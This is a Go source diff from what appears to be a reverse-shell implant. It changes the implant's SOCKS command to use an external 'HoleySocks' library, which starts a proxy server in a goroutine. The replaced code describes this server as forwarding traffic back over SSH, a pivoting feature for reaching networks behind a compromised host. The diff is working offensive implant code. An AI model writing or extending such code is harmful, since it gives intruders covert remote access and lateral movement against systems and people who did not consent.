@@ -8,11 +8,12 @@ import (
 	"os/exec"
 	"os/user"
 	"path/filepath"
+	"time"
 
+	"github.com/audibleblink/HoleySocks/pkg/holeysocks"
 	"github.com/audibleblink/gorsh/internal/directory"
 	"github.com/audibleblink/gorsh/internal/fetch"
 	"github.com/audibleblink/gorsh/internal/sitrep"
-	"github.com/audibleblink/gorsh/internal/socks"
 	"github.com/audibleblink/gorsh/internal/zip"
 	"github.com/shirou/gopsutil/process"
 )
@@ -167,12 +168,24 @@ func Route(argv []string) string {
 
 // Command functions
 func socksFn(argv ...string) string {
-	// concurrent function that starts socks server and forwards back over ssh
-	err := socks.ListenAndForward(argv[1])
-	if err != nil {
-		return err.Error()
+	// TODO  Pass channels down to report errors.
+	output := make(chan string)
+	failed := make(chan bool)
+	go func() {
+		err := holeysocks.DarnSocks()
+		if err != nil {
+			failed <- true
+			output <- err.Error()
+		}
+	}()
+
+	time.Sleep(1 * time.Second)
+	select {
+	case <-failed:
+		return <-output
+	default:
+		return "Server started"
 	}
-	return "Done"
 }
 
 func cdFn(argv ...string) string {
